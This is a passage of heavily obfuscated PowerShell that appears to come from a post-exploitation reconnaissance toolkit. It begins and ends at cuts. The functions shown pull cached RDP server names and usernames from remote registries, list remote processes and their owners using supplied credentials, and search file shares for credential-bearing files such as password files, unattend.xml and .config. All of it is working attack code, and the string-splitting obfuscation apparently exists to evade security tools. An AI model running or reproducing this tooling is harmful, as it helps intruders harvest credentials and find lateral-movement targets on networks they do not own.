            ${k`ey} = ((("{11}{2}{1}{14}{8}{12}{7}{4}{6}{10}{5}{13}{3}{0}{9}"-f 'onU',("{0}{1}" -f 'FTW','ARE'),'O',("{1}{0}{2}" -f'rWeLo','ion','g'),'trW','rr',("{1}{0}" -f 'do','eWin'),'sof','ic','I',("{1}{0}"-f 'srWeCu','w'),'S','ro',("{4}{2}{1}{0}{3}"-f 'ent','onrWeAuth','Versi','icat','ent'),("{1}{0}"-f'WeM','r')))."R`EPLA`Ce"(([CHAR]114+[CHAR]87+[CHAR]101),'\'))
            ${V`A`lUe} = ("{2}{3}{0}{1}"-f ("{1}{0}" -f 'dOn','e'),("{0}{1}" -f 'U','ser'),("{0}{1}" -f 'La','stLo'),'gg')
            ${r`EG}.("{0}{1}{2}"-f 'Ge',("{1}{0}"-f 'tring','tS'),("{1}{0}" -f'e','Valu'))."I`NVOKe"(${HK`LM}, ${k`ey}, ${vAL`Ue})."sv`ALue"
        }
        catch {
            &("{1}{0}{3}{2}"-f ("{0}{1}"-f '-W','ar'),("{1}{0}" -f'rite','W'),'ing','n') ('[!]'+' '+'E'+'rr'+'or '+'o'+'pe'+("{1}{0}"-f 'ing ','n')+'r'+("{1}{0}" -f 'e ','emot')+'r'+("{1}{0}"-f 'stry ','egi')+'on'+' '+("$ComputerName. "+'')+'R'+("{0}{1}"-f'emo','t')+'e '+'r'+("{1}{0}{2}"-f 'gist','e','r')+'y '+("{1}{0}" -f 'el','lik')+'y'+' '+'no'+'t '+("{1}{0}"-f'abl','en')+'ed.')
            ${N`ULl}
        }
    }
}


function G`ET`-`Ca`cHedRDp`cO`NnecTiON {


    [CmdletBinding()]
    param(
        [Parameter(vALUEfrompIPeLINe=${Tr`Ue})]
        [String]
        ${computeR`N`AMe} = ("{0}{2}{1}"-f ("{0}{1}" -f 'loca','l'),'t','hos'),

        [String]
        ${reMot`e`UsEr`NamE},

        [String]
        ${remoT`ep`AsSw`ord}
    )

    begin {
        if (${Re`mOTEUs`erNa`Me} -and ${r`eM`otEp`ASsword}) {
            ${PA`s`S`woRD} = ${remo`TEpaS`S`Wo`RD} | &("{0}{6}{5}{3}{2}{4}{1}"-f'C','ing','t','S','r',("{2}{1}{0}"-f 'ure','Sec','o-'),("{0}{1}{2}" -f'o','nve','rtT')) -AsPlainText -Force
            ${c`R`e`dentIaL} = &("{0}{2}{1}" -f'N','ct',("{0}{1}"-f'ew-Obj','e')) ("{2}{4}{6}{0}{3}{9}{10}{5}{1}{8}{7}"-f 'e','S',("{1}{0}"-f '.M','System'),'nt.','an','n.P',("{1}{0}"-f'em','ag'),("{1}{0}{2}"-f 'e','d','ntial'),'Cre',("{0}{1}" -f'A','utom'),("{1}{0}"-f 'io','at'))(${RE`m`oTeuse`Rn`AMe},${Pa`s`S`worD})
        }

        
        ${H`Ku} = 2147483651
    }

    process {

        try {
            if(${CReD`e`N`TiAL}) {
                ${R`EG} = &("{0}{3}{2}{1}"-f ("{1}{0}{2}" -f'-W','Get','mio'),'t','jec','b') -List ("{3}{0}{1}{2}"-f 'eg','Pro','v',("{0}{1}" -f 'St','dR')) -Namespace ((("{2}{3}{1}{0}"-f("{1}{0}"-f't','aul'),'t{0}def','r','oo'))-F  [cHAR]92) -Computername ${Co`mpUTeR`NAMe} -Credential ${creDenT`I`AL} -ErrorAction ("{2}{0}{1}"-f ("{1}{0}"-f'n','nti'),'ue',("{1}{2}{0}" -f 'tlyCo','Sile','n'))
            }
            else {
                ${R`EG} = &("{3}{2}{0}{1}"-f("{0}{1}" -f 'Wm','iobj'),'ect','et-','G') -List ("{1}{2}{0}" -f'v','S',("{2}{1}{0}" -f'ro','P','tdReg')) -Namespace ((("{1}{3}{0}{2}" -f '1d','ro',("{1}{0}" -f 'fault','e'),("{1}{0}" -f'Xm','ot'))) -REPlacE  ([cHar]88+[cHar]109+[cHar]49),[cHar]92) -Computername ${c`oM`PuternAME} -ErrorAction ("{2}{1}{0}{3}"-f'on',("{2}{1}{0}"-f'C','y','entl'),'Sil',("{0}{1}" -f 'ti','nue'))
            }
        }
        catch {
            &("{3}{1}{0}{2}"-f 'Wa',("{0}{1}" -f'ite','-'),("{0}{1}"-f'rn','ing'),'Wr') (("{0}{1}" -f'E','rror')+' '+'a'+'cc'+'ess'+("{0}{1}"-f'ing',' ')+("$ComputerName, "+'')+'lik'+("{0}{1}"-f 'e','ly ')+'ins'+'uff'+("{0}{1}{2}" -f'icien','t',' ')+'pe'+'r'+("{1}{2}{0}"-f' ','mission','s')+'o'+'r '+("{1}{0}" -f 'e','fir')+'wa'+'ll '+'r'+'ule'+'s '+'on'+' '+'ho'+'st')
        }

        if(!${R`Eg}) {
            &("{1}{3}{2}{0}"-f("{1}{0}" -f'g','rnin'),'Wri','-Wa','te') (("{0}{1}" -f 'E','rror')+' '+'a'+'cce'+("{0}{1}" -f 's','sing ')+("$ComputerName, "+'')+'l'+("{0}{1}"-f 'ikel','y ')+("{0}{1}"-f'ins','u')+("{0}{1}" -f 'ff','ici')+'en'+'t '+'pe'+'rmi'+'s'+("{1}{0}"-f'ions ','s')+'or'+' '+'fir'+'e'+("{1}{0}" -f' ','wall')+'rul'+'es '+'on'+' '+'h'+'ost')
        }
        else {
            
            ${USe`R`S`idS} = (${r`EG}.("{0}{1}" -f ("{0}{1}" -f 'Enu','m'),'Key')."in`VOKE"(${h`ku}, ""))."sn`AM`es" | &('?') { ${_} -match ((("{1}{0}"-f'1-','S-')+'5-2'+("{1}{0}" -f'0-','1-[')+("{0}{1}"-f '9]','+-[')+'0-'+'9'+("{2}{1}{0}" -f '0-9]','+-[',']')+("{0}{1}"-f'+-[0-','9')+("{0}{1}" -f ']+S','VJ'))."rEp`lACe"(([cHAr]83+[cHAr]86+[cHAr]74),[STriNg][cHAr]36)) }

            foreach (${US`eR`sid} in ${USers`I`DS}) {

                try {
                    ${uSEr`N`AME} = &("{0}{3}{2}{1}" -f 'C',("{0}{2}{1}"-f 'Sid','e','ToNam'),("{1}{0}"-f 't-','ver'),'on') ${u`SeR`Sid}

                    
                    ${coNN`ECtI`OnKeyS} = ${r`Eg}.("{1}{3}{0}{2}"-f'l','En','ues',("{0}{1}"-f'umV','a'))."i`NvOke"(${H`ku},(("$UserSID\Software\Microsoft\Terminal "+'')+("{1}{0}" -f'erve','S')+'r '+((("{0}{1}" -f 'Cli','en')+'t'+("{1}{0}"-f '0De','gv')+'fau'+'lt')-REpLACE ([CHar]103+[CHar]118+[CHar]48),[CHar]92)))."sN`AmEs"

                    foreach (${coNN`ecT`ION} in ${cONNEC`TioN`kE`ys}) {
                        
                        if(${Co`NNE`CTI`oN} -match ("{1}{0}" -f'.*','MRU')) {
                            ${TAR`GE`T`SE`RVEr} = ${R`EG}.("{1}{2}{0}" -f("{1}{0}"-f 'e','alu'),("{1}{0}{2}" -f 'tS','Ge','trin'),'gV')."inv`okE"(${h`Ku}, (("$UserSID\Software\Microsoft\Terminal "+'')+("{0}{1}"-f'Serv','er')+' '+(("{1}{2}{0}" -f 'ent','C','li')+("{0}{1}" -f'5','7ED')+'ef'+("{0}{1}"-f'au','lt'))."r`Ep`lACe"(([char]53+[char]55+[char]69),'\')), ${c`O`NneCTI`on})."sVA`L`UE"
                            
                            ${f`OUN`dC`O`NnECtI`ON} = &("{0}{2}{1}" -f("{1}{0}"-f'O','New-'),'ect','bj') ("{0}{1}{2}"-f'PS',("{0}{1}"-f 'O','bje'),'ct')
                            ${FOUnDCon`Ne`C`TioN} | &("{2}{0}{1}{3}" -f 'mb','e',("{0}{1}"-f 'Add-M','e'),'r') ("{0}{3}{2}{1}" -f 'N','y','rt',("{0}{1}" -f'ot','eprope')) ("{2}{0}{1}{3}"-f 'omp',("{0}{1}" -f'u','terNam'),'C','e') ${cOm`P`UTerNAMe}
                            ${fo`UNDCONNecTi`ON} | &("{1}{2}{3}{0}" -f'ber',("{0}{1}"-f 'Add-','M'),'e','m') ("{3}{0}{1}{2}"-f'tep','r',("{1}{0}{2}" -f'ert','op','y'),'No') ("{1}{2}{0}"-f'e',("{1}{0}"-f'er','Us'),'Nam') ${U`sERn`AmE}
                            ${fO`UNd`Co`N`NecTIoN} | &("{0}{2}{1}" -f'Ad',("{1}{0}" -f'mber','Me'),'d-') ("{3}{2}{0}{1}"-f 'rop',("{0}{1}" -f 'e','rty'),'p',("{1}{0}" -f 'te','No')) ("{2}{0}{1}" -f'er','SID','Us') ${US`E`RsiD}
                            ${fou`Ndc`O`NN`EcTiOn} | &("{1}{2}{3}{0}"-f 'r','Ad','d',("{1}{0}"-f'mbe','-Me')) ("{2}{3}{1}{0}"-f ("{1}{0}"-f 'rty','e'),'p','No',("{0}{1}"-f 'tepr','o')) ("{1}{0}{3}{2}" -f't',("{0}{1}"-f 'Tar','ge'),("{0}{1}" -f 'erv','er'),'S') ${TARG`ETS`er`Ver}
                            ${FOU`Ndco`N`N`eCti`ON} | &("{2}{0}{1}" -f("{0}{1}"-f'dd','-Memb'),'er','A') ("{2}{1}{0}"-f("{1}{0}"-f'rty','eprope'),'ot','N') ("{1}{3}{2}{0}"-f("{1}{0}" -f't','Hin'),'Use','ame','rn') ${Nu`ll}
                            ${fOund`COnNEct`I`on}
                        }
                    }

                    
                    ${S`E`RverK`eYs} = ${r`Eg}.("{0}{1}" -f'Enu',("{1}{0}" -f'Key','m'))."i`Nvo`kE"(${H`KU},(("$UserSID\Software\Microsoft\Terminal "+'')+'Se'+'rve'+'r '+('C'+'lie'+("{1}{0}{2}"-f'ox','ntN','S')+'erv'+'ers')."re`Pl`ACe"(([CHAR]78+[CHAR]111+[CHAR]120),[sTRINg][CHAR]92)))."snAM`eS"

                    foreach (${S`e`Rver} in ${s`ERve`RK`Eys}) {

                        ${U`SERna`m`ehINt} = ${R`eg}.("{0}{2}{3}{1}{4}" -f("{0}{1}{2}"-f 'G','etSt','r'),'l','in','gVa','ue')."invO`KE"(${h`kU}, (("$UserSID\Software\Microsoft\Terminal "+'')+("{1}{0}" -f 'erve','S')+'r '+"Client\Servers\$Server"), ("{3}{1}{2}{0}" -f ("{0}{1}" -f 'H','int'),("{0}{1}"-f'ser','nam'),'e','U'))."SvA`l`Ue"
                        
                        ${f`Ou`N`DcoNnec`Ti`on} = &("{0}{1}{2}"-f ("{1}{0}"-f'-','New'),("{1}{0}" -f 'je','Ob'),'ct') ("{0}{2}{1}"-f'P','t',("{1}{0}{2}" -f'bje','SO','c'))
                        ${FoUn`dC`onn`eCTION} | &("{2}{1}{0}" -f("{0}{1}{2}"-f 'd','-Memb','er'),'d','A') ("{2}{0}{1}{3}"-f 'op','er',("{0}{1}"-f 'Not','epr'),'ty') ("{3}{0}{2}{1}"-f'pu','ame',("{0}{1}"-f 'te','rN'),'Com') ${cOm`Pu`TErN`AMe}
                        ${FOUn`dco`N`N`eCTiOn} | &("{2}{0}{1}{3}"-f ("{1}{0}"-f'M','dd-'),'emb','A','er') ("{1}{2}{0}{3}"-f ("{0}{1}" -f'ro','pe'),'Not','ep','rty') ("{1}{2}{0}" -f'me',("{0}{1}" -f 'U','serN'),'a') ${Us`ErnaMe}
                        ${foU`Ndc`oNNEctiOn} | &("{2}{0}{1}"-f 'd-',("{0}{1}"-f'Me','mber'),'Ad') ("{2}{0}{1}{3}" -f 'epr',("{1}{0}"-f'r','ope'),'Not','ty') ("{1}{0}{2}" -f'se','U',("{0}{1}" -f'r','SID')) ${USer`s`ID}
                        ${FO`UNDcoNnEc`TIoN} | &("{1}{0}{2}" -f("{1}{0}"-f 'd-Me','d'),'A',("{1}{0}"-f'r','mbe')) ("{0}{2}{1}"-f'Not',("{1}{0}"-f 'ty','oper'),'epr') ("{1}{2}{3}{0}"-f("{1}{0}" -f 'er','rv'),'Tar','g',("{1}{0}" -f 'tSe','e')) ${SER`VEr}
                        ${f`Ound`CONnE`ctIon} | &("{0}{1}{2}" -f'Ad','d-M',("{1}{0}"-f 'mber','e')) ("{1}{3}{0}{2}" -f'te','N',("{2}{1}{0}"-f 'rty','e','prop'),'o') ("{1}{2}{0}"-f 't',("{0}{1}{2}" -f 'U','ser','nameH'),'in') ${UsErname`h`INT}
                        ${fo`UNDConNEC`T`iON}   
                    }

                }
                catch {
                    &("{0}{2}{3}{1}"-f'W','g','ri',("{0}{2}{1}"-f'te-De','u','b')) ('Err'+'or'+': '+"$_")
                }
            }
        }
    }
}


function GEt`-nEtProcE`sS {


    [CmdletBinding()]
    param(
        [Parameter(valueFROMPIPeLinE=${Tr`UE})]
        [String]
        ${C`omPU`TEr`NAme},

        [String]
        ${rem`oTEusE`Rn`AME},

        [String]
        ${R`E`MoTEP`ASsWo`RD}
    )

    process {
        
        if(${c`o`MpUtErN`Ame}) {
            
            ${c`ompuT`Er`NAMe} = &("{2}{0}{1}" -f ("{0}{1}{2}" -f 't-','Nam','e'),("{1}{0}" -f 'eld','Fi'),'Ge') -Object ${COMPu`TER`Na`me}          
        }
        else {
            
            ${comput`ER`NAme} =  ${2ODJ`Z9}::("{1}{0}{2}" -f 'Na',("{0}{1}" -f 'GetHos','t'),'me')."Inv`o`kE"()
        }

        ${cRE`DEnti`Al} = ${n`ULL}

        if(${R`e`mOteuSERn`A`Me}) {
            if(${R`eMOteP`ASsWord}) {
                ${pas`S`wo`RD} = ${rEmote`p`A`sSWorD} | &("{2}{4}{5}{1}{3}{0}" -f'ing','ec','Con',("{0}{1}" -f'ure','Str'),("{0}{1}" -f 'ver','t'),("{1}{0}"-f '-S','To')) -AsPlainText -Force
                ${c`ReDe`NTIaL} = &("{1}{0}{2}"-f ("{0}{1}"-f 'Obj','ec'),("{1}{0}"-f '-','New'),'t') ("{8}{6}{2}{0}{9}{3}{5}{1}{4}{7}"-f("{2}{1}{0}" -f 'e','m','.Manage'),'e','m',("{0}{1}" -f'tio','n'),("{0}{1}" -f 'de','ntia'),("{0}{1}" -f'.PSC','r'),'e','l',("{1}{0}"-f'st','Sy'),("{0}{2}{1}"-f'nt.Aut','a','om'))(${REmoteu`Se`RnaME},${pa`SS`word})

                
                try {
                    &("{2}{0}{1}"-f("{0}{1}" -f'Iob','je'),'ct',("{0}{1}"-f 'Get-W','M')) -Class ("{2}{1}{3}{0}"-f ("{1}{0}" -f'ess','proc'),'i','W',("{1}{0}"-f'_','n32')) -ComputerName ${C`O`MPUter`Name} -Credential ${c`Red`ENTI`AL} | &("{3}{2}{0}{1}"-f ("{1}{0}{2}"-f'c','a','h-Ob'),("{0}{1}" -f 'j','ect'),'orE','F') {
                        ${Ow`NER} = ${_}.("{0}{1}{2}" -f'ge','to',("{0}{1}"-f'w','ner'))."inVo`KE"();
                        ${pro`CEss} = &("{2}{1}{0}"-f 't',("{1}{0}"-f'-Objec','ew'),'N') ("{1}{0}{2}" -f'jec',("{0}{1}" -f'PSO','b'),'t')
                        ${P`R`oCEsS} | &("{2}{0}{1}"-f ("{0}{1}" -f'dd','-Me'),("{0}{1}"-f 'm','ber'),'A') ("{1}{0}{2}{3}"-f'tep','No',("{1}{0}" -f 'rt','rope'),'y') ("{0}{1}{3}{2}" -f 'C',("{0}{1}" -f 'omput','er'),'me','Na') ${c`OMP`Uter`N`AMe}
                        ${p`R`ocESs} | &("{0}{2}{1}" -f("{1}{0}"-f 'dd-Me','A'),'er','mb') ("{2}{3}{0}{1}" -f'per','ty',("{1}{2}{0}" -f 'r','Not','ep'),'o') ("{0}{2}{1}"-f'P','e',("{0}{1}{2}" -f'ro','c','essNam')) ${_}."Pr`ocesS`N`Ame"
                        ${Pr`ocE`SS} | &("{1}{3}{2}{0}"-f("{1}{2}{0}" -f 'er','Me','mb'),'A','d-','d') ("{3}{2}{1}{0}" -f 'y','t',("{0}{1}"-f 'rope','r'),("{1}{0}"-f'ep','Not')) ("{3}{1}{2}{0}" -f 'D','oc',("{0}{1}"-f 'es','sI'),'Pr') ${_}."PRoce`s`SiD"
                        ${p`Ro`CeSS} | &("{0}{1}{2}{3}" -f 'A','d','d',("{0}{1}"-f'-Memb','er')) ("{0}{2}{1}"-f ("{0}{1}" -f 'Notep','r'),'rty','ope') ("{1}{0}"-f("{1}{0}" -f 'ain','om'),'D') ${o`wN`Er}."doM`AIn"
                        ${prOc`E`SS} | &("{1}{3}{2}{0}"-f ("{1}{0}"-f 'r','mbe'),'A','-Me','dd') ("{2}{3}{0}{1}" -f 'p',("{1}{0}" -f 'operty','r'),'N','ote') ("{0}{1}" -f'Us','er') ${OW`NEr}."u`sER"
                        ${p`RoC`esS}
                    }
                }
                catch {
                    &("{2}{1}{0}"-f ("{2}{0}{1}"-f'bos','e','-Ver'),'e',("{1}{0}" -f'it','Wr')) ('[!'+'] '+'Err'+'or '+'e'+'num'+'e'+("{2}{0}{1}" -f'g',' ','ratin')+'r'+'em'+("{0}{1}" -f 'ote',' ')+'p'+'r'+'o'+("{0}{2}{1}"-f 'c','es, ','ess')+'acc'+("{0}{1}" -f 'ess',' ')+'l'+("{2}{1}{0}" -f'y ','kel','i')+("{0}{1}"-f 'd','eni')+'ed:'+' '+"$_")
                }
            }
            else {
                &("{1}{2}{0}"-f'ng','Wr',("{0}{2}{1}"-f 'ite','Warni','-')) ("{6}{3}{2}{4}{0}{7}{1}{5}{8}"-f("{0}{2}{1}"-f 's','ord mu','sw'),' ','teP','emo','a',("{0}{1}"-f'sup','pli'),("{0}{1}"-f '[!]',' R'),("{2}{0}{1}"-f' a','lso be','st'),'ed!')
            }
        }
        else {
            
            try {
                &("{1}{0}{2}" -f'bje',("{2}{0}{1}" -f 't-W','MIo','Ge'),'ct') -Class ("{3}{1}{0}{4}{2}" -f'o',("{1}{0}"-f'r','2_p'),'ss',("{1}{0}" -f '3','Win'),'ce') -ComputerName ${coM`pUt`ern`AmE} | &("{3}{0}{1}{2}"-f'orE',("{0}{1}" -f 'ach-O','b'),("{1}{0}"-f'ct','je'),'F') {
                    ${Own`eR} = ${_}.("{0}{1}{2}"-f'ge',("{0}{1}" -f 'tow','ne'),'r')."in`VOKe"();
                    ${pr`oceSs} = &("{1}{0}{2}"-f'bje',("{1}{0}" -f 'w-O','Ne'),'ct') ("{1}{0}"-f'ct',("{1}{0}"-f 'Obje','PS'))
                    ${pr`oC`esS} | &("{1}{2}{0}"-f 'ber','Ad',("{1}{0}" -f'em','d-M')) ("{0}{1}{2}"-f 'Not',("{0}{1}" -f 'e','pro'),("{1}{0}"-f 'erty','p')) ("{0}{3}{2}{1}" -f'Co',("{1}{0}" -f'me','Na'),'ter','mpu') ${coMPUTE`RNa`mE}
                    ${prO`c`Ess} | &("{0}{1}{2}" -f ("{0}{1}" -f 'Add-M','e'),'mbe','r') ("{1}{0}{2}"-f ("{0}{1}"-f'e','prop'),'Not',("{1}{0}"-f 'y','ert')) ("{2}{1}{0}" -f'ame','ssN',("{1}{0}" -f'e','Proc')) ${_}."p`ROCeSsN`A`mE"
                    ${PrO`ce`sS} | &("{0}{1}{2}" -f 'A',("{1}{0}"-f 'Me','dd-'),("{1}{0}" -f'r','mbe')) ("{1}{0}{2}{3}" -f'ot','N','ep',("{1}{0}{2}"-f 'er','rop','ty')) ("{0}{1}" -f("{0}{1}" -f 'Pro','c'),("{0}{1}"-f 'e','ssID')) ${_}."P`RoCeS`siD"
                    ${p`RoCe`ss} | &("{2}{0}{1}{3}"-f'd-M','emb','Ad','er') ("{0}{2}{1}{3}" -f'N',("{1}{0}"-f 'r','rope'),("{1}{0}" -f'tep','o'),'ty') ("{1}{0}" -f'n',("{1}{0}"-f'mai','Do')) ${oWN`ER}."DOm`AiN"
                    ${pRocE`Ss} | &("{1}{0}{2}" -f ("{1}{0}" -f'b','-Mem'),'Add','er') ("{1}{2}{3}{0}"-f 'ty','Not',("{0}{1}" -f'e','pro'),'per') ("{0}{1}"-f 'U','ser') ${ow`NER}."U`SEr"
                    ${p`RocesS}
                }
            }
            catch {
                &("{2}{3}{1}{4}{0}" -f'se','t','W','ri',("{2}{0}{1}" -f 'V','erbo','e-')) ('[!]'+' '+'E'+'rro'+'r '+("{0}{1}" -f'en','umera')+'t'+'in'+'g '+'re'+'mo'+'te '+'p'+("{1}{0}" -f'e','roc')+'ss'+("{1}{0}" -f' ','es,')+'acc'+'ess'+' '+'li'+'ke'+'ly '+'d'+("{1}{0}" -f'ie','en')+'d: '+"$_")
            }
        }
    }
}


function FiNd-INT`eRestI`N`GfILe {


    [CmdletBinding()]
    param(
        [Parameter(vALUEfrompIpeLINE=${T`RUE})]
        [String]
        ${P`AtH} = '.\',

        [String[]]
        ${te`Rms},

        [Switch]
        ${OFfICE`DO`cs},

        [Switch]
        ${fREsH`EX`es},

        [String]
        ${lA`s`TAcceSstI`me},

        [String]
        ${L`AS`TWr`Ite`TimE},

        [String]
        ${C`ReAtiOnT`imE},

        [Switch]
        ${eXClUDE`F`OlDeRs},

        [Switch]
        ${exclUD`eH`idd`eN},

        [Switch]
        ${C`H`e`ckwRIT`E`AcCesS},

        [String]
        ${oU`TfIle},

        [Switch]
        ${USe`pSDR`I`Ve},

        [System.Management.Automation.PSCredential]
        ${c`Red`EN`TIAL} =  (  &("{4}{2}{3}{0}{1}" -f 'i',("{0}{1}{2}" -f'L','dI','TEM'),'C','h',("{1}{0}" -f'-','Get')) ("{0}{3}{1}{2}"-f 'V','p','i','AriAbLE:T65')  )."v`ALuE"::"EMp`Ty"
    )

    begin {
        
        ${s`e`ArchT`ErMs} = @(("{1}{0}"-f's','pas'), ("{0}{1}{2}" -f's','e',("{0}{1}" -f'n','sitive')), ("{1}{0}"-f 'min','ad'), ("{1}{0}"-f'in','log'), ("{1}{0}"-f("{0}{1}" -f'c','ret'),'se'), ("{1}{3}{2}{0}" -f ("{0}{1}"-f '.x','ml'),'u',("{0}{1}"-f 'te','nd*'),'nat'), ("{1}{0}" -f("{0}{1}"-f 'v','mdk'),'.'), ("{0}{1}"-f 'cr','eds'), ("{2}{0}{1}"-f ("{0}{2}{1}"-f 'r','dent','e'),'ial','c'), ("{0}{1}" -f '.c',("{0}{1}"-f'on','fig')))

        if(!${P`ATH}.("{0}{1}{2}" -f 'End',("{0}{1}" -f 'sWi','t'),'h')."iNVO`Ke"('\')) {
            ${p`ATh} = ${P`ATh} + '\'
        }
        if(${CREd`enT`iaL} -ne  ( &("{0}{2}{1}" -f ("{1}{0}" -f'i','vAR'),'E','abL') ("{0}{1}" -f't65p','I')  -vaLUeOnL  )::"emP`Ty") { ${us`EpSDR`I`VE} = ${T`RUE} }

        
        if (${T`Erms}) {
            if(${Te`R`MS} -isnot [system.array]) {
                ${t`eRmS} = @(${Te`RMS})
            }
            ${SEA`R`cHterms} = ${t`er`MS}
        }

        if(-not ${SeA`RcHt`E`RMs}[0].("{1}{2}{0}{3}"-f 'swi','st','art','th')."IN`V`oKe"("*")) {
            
            for (${i} = 0; ${i} -lt ${seA`Rch`T`eRMS}."co`Unt"; ${i}++) {
                ${s`Ear`chtE`RmS}[${I}] = "*$($SearchTerms[$i])*"
            }
        }

        
        if (${ofF`I`ced`OCS}) {
            ${se`A`RCHtE`RmS} = @(("{0}{1}" -f'*.d','oc'), ("{0}{1}" -f ("{1}{0}"-f '.do','*'),'cx'), ("{1}{0}"-f's',("{0}{1}"-f '*.','xl')), ("{1}{0}"-f 'sx',("{1}{0}"-f 'l','*.x')), ("{1}{0}"-f't',("{1}{0}" -f'p','*.p')), ("{0}{1}"-f("{1}{0}"-f'p','*.p'),'tx'))
        }

        
        if(${Fre`sH`eXeS}) {
            
            ${LASta`CcE`S`S`TIme} = (&("{2}{1}{0}" -f("{1}{0}" -f'e','-dat'),'et','g')).("{2}{1}{0}" -f ("{0}{1}" -f'd','Days'),'d','A')."InV`o`Ke"(-7).("{2}{0}{1}"-f ("{0}{1}"-f'oS','tr'),'ing','T')."i`NV`Oke"(("{1}{0}{2}" -f'dd/','MM/',("{1}{0}"-f'yyy','y')))
            ${s`EarC`hT`ErmS} = ("{1}{0}" -f 'xe','*.e')
        }

        if(${US`e`PSdRi`VE}) {
            
            ${P`ArtS} = ${p`ATH}.("{1}{0}" -f 'it','spl')."INVo`KE"('\')
            ${f`Ol`D`ERpAtH} = ${paR`Ts}[0..(${pA`R`Ts}."lEnG`TH"-2)] -join '\'
            ${fIL`E`PAth} = ${p`A`RtS}[-1]
            ${r`ANd`dR`Ive} = (("{4}{1}{6}{3}{5}{2}{0}" -f("{1}{0}{2}" -f 'v','stu','wxyz'),("{1}{0}"-f'ef','bcd'),'r','ijk','a',("{0}{1}"-f 'lmnop','q'),'gh').("{3}{0}{1}{2}"-f 'oC','har',("{1}{0}"-f'ray','Ar'),'T')."INvo`Ke"() | &("{1}{0}{2}"-f'Ran',("{0}{1}"-f'G','et-'),'dom') -Count 7) -join ''
            
            &("{3}{1}{2}{0}"-f 'se','rb','o',("{0}{1}{2}" -f 'Writ','e','-Ve')) ('M'+("{1}{0}" -f't','oun')+("{1}{0}"-f 'g ','in')+'pa'+'th '+("$Path "+'')+'u'+("{0}{1}"-f 'si','ng ')+'a '+'t'+("{0}{1}" -f 'emp',' ')+'PSD'+'riv'+'e '+'a'+'t '+"$RandDrive")

            try {
                ${N`ULl} = &("{2}{1}{0}"-f 'e',("{1}{0}" -f'iv','Dr'),("{1}{0}"-f'S','New-P')) -Name ${r`ANDd`RIve} -Credential ${cR`EDe`NtIaL} -PSProvider ("{0}{2}{1}"-f ("{0}{1}"-f 'Fi','le'),'tem','Sys') -Root ${f`OldErPA`Th} -ErrorAction ("{0}{1}"-f'Sto','p')
            }
            catch {
                &("{2}{3}{1}{0}" -f("{1}{0}" -f 'bug','e'),("{0}{1}" -f 'te-','D'),'Wr','i') ('Err'+'or '+'m'+("{1}{0}"-f'ti','oun')+'ng '+'p'+("{1}{0}"-f 'h ','at')+("$Path "+'')+': '+"$_")
                return ${nu`LL}
            }

            
            ${pA`TH} = ${R`AND`dr`IVE} + ":\" + ${f`ILepA`Th}
        }
    }

    process {

        &("{2}{0}{1}" -f("{0}{1}" -f'ite-','Ver'),("{1}{0}" -f'e','bos'),'Wr') ('[*'+'] '+'Se'+("{0}{1}"-f'arc','h ')+("{1}{0}"-f'ath','p')+' '+"$Path")

        function i`N`VokE`-CheCKWri`TE {
            
            [CmdletBinding()]param([String]${PA`Th})
            try {
                ${f`I`lETe`ST} =  ${s`iA}::("{2}{0}{1}"-f'nWr','ite','Ope')."invo`kE"(${PA`TH})
                ${f`ILeT`EST}.("{1}{0}"-f 'se','Clo')."IN`Vo`kE"()
                ${tr`Ue}
            }
            catch {
                &("{3}{1}{0}{2}" -f'te','i',("{1}{2}{0}"-f'e','-Verb','os'),'Wr') -Message ${Err`or}[0]
                ${F`AL`se}
            }
        }

        ${S`eAR`ch`ARgs} =  @{
            ("{0}{1}"-f 'P','ath') = ${P`ATH}
            ("{1}{0}"-f 'rse',("{0}{1}"-f 'R','ecu')) = ${tr`UE}
            ("{1}{0}"-f 'rce','Fo') = $(-not ${e`Xcl`Ude`HIDD`EN})
            ("{0}{1}" -f("{1}{0}" -f'nclud','I'),'e') = ${sEarC`h`T`ERMS}
            ("{0}{2}{1}" -f 'Er',("{0}{1}" -f'o','rAction'),'r') = ("{2}{1}{0}{3}" -f ("{0}{2}{1}"-f'entl','nti','yCo'),'l','Si','nue')
        }

        &("{0}{1}{2}{3}"-f ("{0}{1}"-f'G','et-C'),'hi','l',("{0}{1}"-f'd','Item')) @SearchArgs | &("{3}{2}{0}{1}" -f 'j','ect',("{0}{1}" -f 'rE','ach-Ob'),'Fo') {
            &("{0}{1}{2}"-f'Wr','i',("{0}{2}{1}"-f 'te-V','e','erbos')) ${_}
            
            if(!${E`XcLUD`eFo`ldE`Rs} -or !${_}."psISCoN`T`AiNer") {${_}}
        } | &("{3}{2}{4}{0}{1}"-f 'je','ct',("{0}{1}" -f 'r','Eac'),'Fo',("{1}{0}"-f'Ob','h-')) {
            if(${La`stACCesstI`ME} -or ${l`A`s`T`wrIteTIMe} -or ${cre`At`Io`NTIME}) {
                if(${lA`stA`cCESSTI`me} -and (${_}."L`ASTac`CeSs`T`IME" -gt ${l`A`staCcEs`StiMe})) {${_}}
                elseif(${lAStW`Ri`T`eTi`Me} -and (${_}."l`AStW`RitE`TiME" -gt ${L`AStwRIT`E`TIME})) {${_}}
                elseif(${Cre`ATi`o`NTiME} -and (${_}."CrEaTi`ONt`iME" -gt ${cR`e`ATIoNTIme})) {${_}}
            }
            else {${_}}
        } | &("{0}{1}{2}"-f'For','E',("{1}{2}{3}{0}" -f'ject','a','ch-','Ob')) {
            
            if((-not ${c`H`Eckw`Ri`T`eaccess}) -or (&("{4}{2}{3}{1}{0}"-f("{1}{2}{0}"-f 'te','eckW','ri'),'-Ch','vo','ke','In') -Path ${_}."FUlLN`AMe")) {${_}}
        } | &("{2}{1}{0}{4}{3}"-f'-','t',("{0}{1}"-f 'S','elec'),("{0}{1}" -f 'b','ject'),'O') ("{1}{2}{0}" -f'ame','Ful','lN'),@{("{1}{0}" -f 'ame','N')=("{1}{0}"-f'er','Own');("{0}{2}{1}" -f ("{0}{2}{1}"-f'Ex','ess','pr'),'on','i')={(&("{1}{0}"-f("{0}{1}"-f't-A','cl'),'Ge') ${_}."f`ULl`Name")."oW`NeR"}},("{2}{4}{1}{0}{3}"-f 'e','c','Las',("{1}{2}{0}" -f'e','ssTi','m'),'tAc'),("{1}{3}{2}{0}{4}" -f 'te','Las','Wri','t',("{1}{0}" -f'me','Ti')),("{0}{3}{1}{2}"-f 'Cr','i',("{1}{0}"-f 'e','onTim'),'eat'),("{0}{1}{2}" -f 'Le','n','gth') | &("{0}{3}{1}{2}" -f 'F','rEa',("{2}{0}{1}" -f'Obje','ct','ch-'),'o') {
            
